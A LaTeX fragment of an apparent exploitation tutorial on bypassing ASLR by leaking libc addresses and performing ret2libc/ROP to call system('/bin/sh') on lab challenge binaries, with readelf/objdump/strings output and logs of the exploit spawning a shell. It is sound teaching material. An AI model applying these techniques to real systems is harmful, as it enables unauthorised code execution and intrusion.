% overwriting variables and return address
\subsection{Memory Corruption}

% shellcode, nop sled
\subsection{Shellcoding}

% ret2libc, stack faking
\subsection{DEP, ROP, and ret2libc}

% aslr, rop, leaks
\subsection{ASLR}
\subsubsection{ASLR}
ASLR, or Address Space Layout Randomization, is a mitigation technique in which
the locations of the stack, heap, and shared libraries are randomized at
runtime. This makes ROP and ret2libc attacks more difficult, since the attacker
can't reliably jump to those parts of the code. However, ASLR does not randomize
code within a single section. This means that if an attacker can leak the
address of any library function they can then learn the locations of all of the
code in the library.

\subsubsection{Exploiting a leak}
Consider this program, which intentionally leaks a libc address.
\lstinputlisting{../challenges/rops/leakRop.c}
In the program above, the address of $\texttt{puts()}$ is leaked before the
program prompts for input. This means given the copy of libc that the program is
using, we can use the function offsets to find the location of every other libc
function. In particular, the location of any libc function will be
[leaked puts address] - [puts offset] + [function offset].

We can get the program's shared libraries by using the \texttt{ldd} command.
\begin{lstlisting}
> ldd leakRop
    linux-gate.so.1 =>  (0xf7763000)
    libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7583000)
    /lib/ld-linux.so.2 (0x565e6000)
\end{lstlisting}

Ignoring the first and last lines, we see that \texttt{leakRop} has
\texttt{libc.so.6} as a dependency, and that it's located on the system at
\texttt{/lib/i386-linux-gnu/libc.so.6}. Using \texttt{objdump}, we can get the
offsets of every function in this copy of libc.
\begin{lstlisting}
> readelf -s /lib/i386-linux-gnu/libc.so.6 | grep puts
   205: 0005fca0   464 FUNC    GLOBAL DEFAULT   13 _IO_puts@@GLIBC_2.0
   434: 0005fca0   464 FUNC    WEAK   DEFAULT   13 puts@@GLIBC_2.0
   509: 000ebb20  1169 FUNC    GLOBAL DEFAULT   13 putspent@@GLIBC_2.0
   697: 000ed1d0   657 FUNC    GLOBAL DEFAULT   13 putsgent@@GLIBC_2.10
  1182: 0005e720   349 FUNC    WEAK   DEFAULT   13 fputs@@GLIBC_2.0
  1736: 0005e720   349 FUNC    GLOBAL DEFAULT   13 _IO_fputs@@GLIBC_2.0
  2389: 000680e0   146 FUNC    WEAK   DEFAULT   13 fputs_unlocked@@GLIBC_2.1
> readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
   245: 00112ed0    68 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr@@GLIBC_2.0
   627: 0003ada0    55 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE
  1457: 0003ada0    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
\end{lstlisting}
The output above shows that \texttt{puts} and \texttt{system} have offsets of
\texttt{0x0005fca0} and \texttt{0x0003ada0} from the start of libc,
respectively. Next we can get the address of "/bin/sh" with \texttt{strings}.
\begin{lstlisting}
> strings -tx /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
 15b9ab /bin/sh
\end{lstlisting}
This is everything we need in order to call \texttt{system("/bin/sh")}, as shown
by this program.

\lstinputlisting{../challenges/rops/input_leakRop.py}

When run, the exploit spawns a shell.

\begin{lstlisting}
> ./input_leakRop.py 
[+] Starting local process './leakRop': pid 16530
[*] leaked puts address: 0xf762aca0
[*] found libc base address 0xf75cb000
[*] found system address 0xf7605da0
[*] found "/bin/sh" address 0xf77269ab
[*] Switching to interactive mode
Please take a seat, we'll be with you at some point this week.
$ whoami
devneal
$  
\end{lstlisting}

\subsubsection{Making a leak}
Programs don't typically leak the addresses of their libc functions for free,
but once we gain control of the program, we can create a leak of our own. After
all, we're free to add any code we want via ret2libc and rop, so why not add
code to leak a libc address? Then once we have the libc address, we can cause
the program to return to the place where we first gained control and this time
use the leak to spawn a shell! Imagine the program below was compiled with
DEP/NX and running on a system which had ASLR enabled.
\lstinputlisting{../challenges/rops/makeLeak.c} Since the program makes several
calls to \texttt{puts()}, it must have entries for \texttt{puts()} in both its
PLT and GOT. We can view them with \texttt{objdump} and \texttt{readelf},
respectively. We can also find the address of \texttt{main()}.

\begin{lstlisting}
> objdump -d -j .plt ../challenges/rops/makeLeak | grep -A 3 puts
08048310 <puts@plt>:
 8048310:	ff 25 10 a0 04 08    	jmp    DWORD PTR ds:0x804a010
 8048316:	68 08 00 00 00       	push   0x8
 804831b:	e9 d0 ff ff ff       	jmp    80482f0 <_init+0x28>
> readelf --relocs ../challenges/rops/makeLeak | grep puts
0804a010  00000207 R_386_JUMP_SLOT   00000000   puts@GLIBC_2.0
> readelf --syms makeLeak | grep main
     4: 00000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@GLIBC_2.0 (2)
    55: 00000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@@GLIBC_
    61: 08048436    77 FUNC    GLOBAL DEFAULT   14 main
\end{lstlisting}

We can tell from the output above that \texttt{puts()} has a PLT address at
\texttt{0x08048310} and a GOT address at \texttt{0x0804a010}. We also see that
\texttt{main()} is located at \texttt{0x08048436}. In order to leak the location
of \texttt{puts()}, we will call \texttt{puts()} (by it's entry in the PLT) to
print it's own libc location (i.e. it's entry in the GOT). We'll then return to
\texttt{main()} and spawn a shell just as we did before. The following script
puts this plan into action.
\lstinputlisting{../challenges/rops/input_makeLeak.py}
When the script is run, it does indeed spawn a shell.
\begin{lstlisting}
> ./input_makeLeak.py
[+] Starting local process './makeLeak': pid 22514
[*] leaked puts address: 0xf7636ca0
[*] found libc base address: 0xf75d7000
[*] found system address: 0xf7611da0
[*] found "/bin/sh" address: 0xf77329ab
[*] Switching to interactive mode
Welcome to the No Security Aggregate
Please sign in with your name.
You tricked us last time with that planted pointer...we won't get fooled again.
Please take a seat, we'll be with you at some point this week.
$ whoami
devneal
$
\end{lstlisting}
